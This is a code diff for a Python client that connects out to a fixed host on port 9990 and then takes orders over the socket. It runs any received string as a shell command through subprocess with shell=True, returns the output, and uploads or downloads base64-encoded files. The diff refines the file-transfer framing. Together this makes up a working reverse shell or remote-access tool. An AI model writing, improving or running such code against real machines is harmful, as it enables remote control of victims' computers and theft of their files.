@@ -6,14 +6,13 @@ import subprocess
 import time
 from typing import List
 import base64
-from filecod_class import Filecod
+from filecode_class import Filecode
 
 def main():
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     client_socket.connect(("0.0.0.0", 9990))
     print("Success connect")
 
-    cod_file :object = Filecod()
     
     while True:
         command = client_socket.recv(1024).decode()
@@ -25,30 +24,23 @@ def main():
                 client_socket.send(f"Change directory on {list_command[1]}".encode())
             
             elif "upload" in command:
+                # upload test/test.txt test/test1.txt
                 list_command :list = on_split(command)
-                file = client_socket.recv(1024)
-                cod_file.on_decode(list_command[1], file)
+                while len(list_command[3]) != int(list_command[2]):
+                    list_command[3] = list_command[3] + client_socket.recv(1024).decode()
 
-                """ on_decode:
-                with open(list_command[1], "wb") as file_open:
-                    file_open.write(base64.b64decode(file))
-                """
+                Filecode.on_decode(list_command[1], list_command[3])
+
+                file_list = list_command[1].split("/")
+                client_socket.send(f"The file {file_list[-1]} has been sent".encode())
             
             elif "download" in command:
-
+                # download test/test.txt test/test2.txt
                 path_in_client :list = on_split(command)
-
-                """ on_split:
-                path_in_client :list = command.split(" ")
-                """
-                """ on_code:
-                with open (path_in_client[1], '+rb') as file:
-                    data = file.read()
-                b64 = base64.b64encode(data)
-                """
-
-                time.sleep(1)
-                client_socket.send(cod_file.on_code(path_in_client[1]))
+                data = Filecode.on_code(path_in_client[1])
+                
+                response = str(len(data)) + " "
+                client_socket.send(response.encode()+data)
 
             else:
                 ex = subprocess.check_output(command, shell=True).decode()
